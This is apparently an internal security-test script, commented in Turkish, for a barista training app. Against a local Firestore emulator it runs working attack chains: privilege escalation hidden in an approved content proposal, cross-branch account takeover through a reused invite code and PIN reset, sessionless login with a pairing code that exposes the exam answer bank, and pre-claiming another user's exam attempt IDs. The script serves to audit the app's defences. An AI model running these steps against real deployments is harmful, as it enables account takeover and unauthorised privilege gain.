// Zincirleme saldırılar, uygulamanın GERÇEK modülleriyle (changes.ts, backend.ts):
//  A) Öneri yoluyla vekil saldırı (ops → direktör onayı → config/permissions, users)
//  B) Başka şubenin davet koduyla hesap ele geçirme (mağaza telefonu S1 → S2 baristası)
//  C) Eşleştirme kodundan telefon hesabına (oturumsuz)
//  D) Kimlik kapma: kurbanın startExam'i (gerçek exam.ts) başarısız olur
import { readFileSync } from 'node:fs';
import { setLogLevel } from 'firebase/app';
setLogLevel('silent');
process.env.FIRESTORE_EMULATOR_HOST = '127.0.0.1:8180';
const { initializeApp, getApps } = await import('firebase-admin/app');
const { getFirestore } = await import('firebase-admin/firestore');
if (!getApps().length) initializeApp({ projectId: 'demo-guvenlik' });
const adb = getFirestore();
const { client } = await import('./lib/istemci.mjs');
const A = JSON.parse(readFileSync(new URL('./out/hesaplar.json', import.meta.url)));
const log = (...x) => console.log(...x);

// ---- A) Öneri yoluyla vekil saldırı
{
  const ops = await client('ops'); await ops.signIn(A.ops.email, A.ops.password);
  await ops.asStaff({ uid: A.ops.uid, name: 'Ops Üyesi', email: A.ops.email, role: 'ops' });
  const chO = await ops.m('api/changes.ts');
  const kotu = [
    { op: 'update', col: 'lessons', id: 'lK', data: { summary: 'Yazım düzeltmesi' } },
    { op: 'set', col: 'config', id: 'permissions', data: { roles: { ops: { icerikYayin: true, oneriOnay: true, baristaYonetim: true, rozetAyar: true } }, domains: {}, log: [] } },
    { op: 'update', col: 'users', id: A.ops.uid, data: { role: 'opsmanager' } }
  ];
  const r = await chO.commitChange(kotu, { kind: 'lesson', title: 'Öğütme: yazım düzeltmesi', summary: '1 kelime' }).catch((e) => 'HATA ' + (e.code || e.name));
  log('A1 ops öneri gönderdi (zararlı işlemlerle, uygulama üzerinden):', r);
  // Uygulamayı atlayıp öneriyi doğrudan yazar (kurallar ops listesini denetleyemez).
  const pref = await ops.fs.addDoc(ops.fs.collection(ops.db, 'proposals'), { kind: 'lesson', title: 'Öğütme: yazım düzeltmesi', summary: '1 kelime', ops: kotu, status: 'pending', createdAt: Date.now(), createdBy: A.ops.uid, createdByName: 'Ops Üyesi', baseUpdatedAt: {} });
  log('A1b aynı öneri doğrudan Firestore\'a yazıldı:', pref.id);
  const pid = pref.id;
  const dir = await client('dir'); await dir.signIn(A.director.email, A.director.password);
  await dir.asStaff({ uid: A.director.uid, name: 'Direktör', email: A.director.email, role: 'director' });
  const chD = await dir.m('api/changes.ts');
  const snap = await adb.doc(`proposals/${pid}`).get();
  const p = { id: pid, ...snap.data() };
  log('A2 direktörün listede gördüğü:', JSON.stringify({ title: p.title, summary: p.summary, kind: p.kind, ops: p.ops.length }));
  log('A2 canPublishOps (Yayınla düğmesi görünür mü):', chD.canPublishOps(p.ops));
  const ap = await chD.approveProposal(p).then(() => 'onaylandı').catch((e) => 'HATA ' + (e.code || e.message));
  log('A3 direktör "Yayınla":', ap);
  const perm = (await adb.doc('config/permissions').get()).data();
  const u = (await adb.doc(`users/${A.ops.uid}`).get()).data();
  log('A4 sonuç: config/permissions.roles.ops =', JSON.stringify(perm.roles?.ops), '| log satırı:', (perm.log || []).length, '| ops kullanıcısının rolü =', u.role);
  // geri al
  await adb.doc(`users/${A.ops.uid}`).update({ role: 'ops' });
  await adb.doc('config/permissions').set({ roles: {}, domains: {}, log: [{ at: Date.now(), byName: '', text: 'x', dev: true }] });
  // A5: sahibi bekleyen önerinin işlemlerini sonradan değiştirebilir mi (onaycı açmışken)
  const r2 = await chO.commitChange([{ op: 'update', col: 'lessons', id: 'lK', data: { summary: 'masum' } }], { kind: 'lesson', title: 'masum', summary: 'masum' });
  const pid2 = chO.lastProposalId;
  const seen = { id: pid2, ...(await adb.doc(`proposals/${pid2}`).get()).data() };
  const ops2 = await ops.m('api/backend.ts');
  const fs = ops.fs;
  await fs.updateDoc(fs.doc(ops.db, 'proposals', pid2), { ops: [{ op: 'update', col: 'users', id: A.ops.uid, data: { role: 'board' } }], updatedAt: Date.now() }).then(() => log('A5 sahibi, bekleyen önerinin ops alanını sessizce değiştirdi: izin')).catch((e) => log('A5 red', e.code));
  // Direktör ekranda eski (masum) kopyayı görüyorsa approveProposal(seen) — uygulama p.ops'u (yerel kopya) uygular
  await chD.approveProposal(seen).then(() => log('A6 direktör ekrandaki eski kopyayı onayladı → uygulanan: ekrandaki işlemler')).catch((e) => log('A6', e.message));
  const after = (await adb.doc(`proposals/${pid2}`).get()).data();
  log('A6 öneri belgesinde ops kayıt:', JSON.stringify(after.ops).slice(0, 120), 'editedOnReview=', after.editedOnReview);
}

// ---- B) Başka şubenin davet koduyla hesap ele geçirme
{
  const ph = await client('ph1'); await ph.signIn(A.phone1.email, A.phone1.password);
  const fs = ph.fs;
  const inv = await fs.getDoc(fs.doc(ph.db, 'invites', A.inviteCode)).then((d) => d.data()).catch((e) => { log('B1 S1 telefonu S2 davetini okuyamadı:', e.code, '(K-2 kapalı)'); return null; });
  if (inv) log('B1 S1 telefonu S2 davetini okudu:', JSON.stringify({ storeId: inv.storeId, email: inv.email, baristaId: inv.baristaId }));
  // S1 telefonu backend.redeemInvite ile S2 kodunu dener: kullanıcıya giden mesaj
  {
    const be1 = (await ph.m('api/backend.ts')).backend;
    const m = await be1.redeemInvite(A.inviteCode, '2580', 'S1').then(() => 'başarılı!').catch((e) => e.message);
    log('B1b S1 telefonunda S2 kodu (uygulama):', m);
  }
  if (inv) {
  // backend.redeemInvite mağaza denetimini istemcide yapar; atlayıp aynı Auth adımlarını uygularız
  const auth = ph.auth;
  await auth.signInWithEmailAndPassword(ph.fb.auth, inv.email, `davet-${A.inviteCode}-1401`);
  await auth.updatePassword(ph.fb.auth.currentUser, `pb-${inv.baristaId}-9999`);
  log('B2 S2 baristasının hesabı ele geçirildi, yeni PIN 9999, oturum uid=', ph.fb.auth.currentUser.uid === A.bN.uid);
  const s2 = await fs.getDocs(fs.query(fs.collection(ph.db, 'baristas'), fs.where('storeId', '==', 'S2'))).then((s) => s.size).catch((e) => e.code);
  log('B3 ele geçirilen hesapla S2 baristaları:', s2);
  }
  // Meşru barista (S2 telefonunda) davet kodunu kullanınca
  const leg = await client('ph2'); await leg.signIn(A.phone2.email, A.phone2.password);
  leg.m('store/session.ts').then((s) => s.useSession.setState({ session: { kind: 'store', uid: A.phone2.uid, storeId: 'S2', storeName: 'Kadıköy' } }));
  const be = (await leg.m('api/backend.ts')).backend;
  const res = await be.redeemInvite(A.inviteCode, '2580', 'S2').then(() => 'başarılı').catch((e) => 'HATA ' + (e.code || e.message));
  log('B4 meşru baristanın davet kullanımı:', res);
}

// ---- C) Eşleştirme kodundan telefon hesabına (oturumsuz)
{
  const x = await client('anon');
  const be = (await x.m('api/backend.ts')).backend;
  const fs = x.fs;
  const p = (await fs.getDoc(fs.doc(x.db, 'pairingCodes', A.pairCode))).data();
  await x.auth.signInWithEmailAndPassword(x.fb.auth, p.email, p.password);
  const n = await fs.getDocs(fs.query(fs.collection(x.db, 'baristas'), fs.where('storeId', '==', 'S2'))).then((s) => s.docs.map((d) => d.data().name).join(', '));
  log('C1 oturumsuz okunan kodla S2 telefonu olarak girildi; baristalar:', n);
  const q = await fs.getDocs(fs.collection(x.db, 'questions')).then((s) => s.size);
  log('C2 aynı hesapla soru bankası (cevap anahtarı):', q);
  log('C3 kod silinmeden önce yeniden kullanılabilir mi (DEMO=false, pairDevice siler); kalıcı şifre değişmiyor: telefon şifresi kalıcı, yalnız revokeDevice ile kesilir');
}

// ---- D) Kimlik kapma: kurbanın gerçek startExam'i
{
  const a = await client('bA2'); await a.signIn(A.bA.email, A.bA.password);
  const fs = a.fs;
  const now = Date.now();
  let ok = 0;
  for (let n = 1; n <= 16; n++) await fs.setDoc(fs.doc(a.db, 'attempts', `bB_mO_sinav_${n}`), { baristaId: 'bA', storeId: 'S1', moduleId: 'mO', lessonId: null, startedAt: now - 30 * 864e5, deadline: now - 30 * 864e5, submittedAt: null, answers: {} }).then(() => ok++).catch(() => {});
  log('D1 bA, bB için 16 kimliği kaptı:', ok);
  const b = await client('bB2'); await b.signIn(A.bB.email, A.bB.password);
  const content = await b.m('store/content.ts');
  content.useContent.setState({ modules: [{ id: 'mO', trackId: 'oryantasyon', title: 'İlk Gün', published: true, passScore: 80, examSize: 10 }], tracks: [{ id: 'oryantasyon', published: true }], lessons: [] });
  const r = await b.exam.startExam({ id: 'mO', title: 'İlk Gün', passScore: 80, examSize: 10, trackId: 'oryantasyon' }, { baristaId: 'bB', storeId: 'S1', name: 'Burak' }).then(() => 'sınav başladı').catch((e) => 'HATA ' + (e.code || '') + ' ' + e.message);
  log('D2 kurban bB mO sınavını başlatır:', r);
}
process.exit(0);
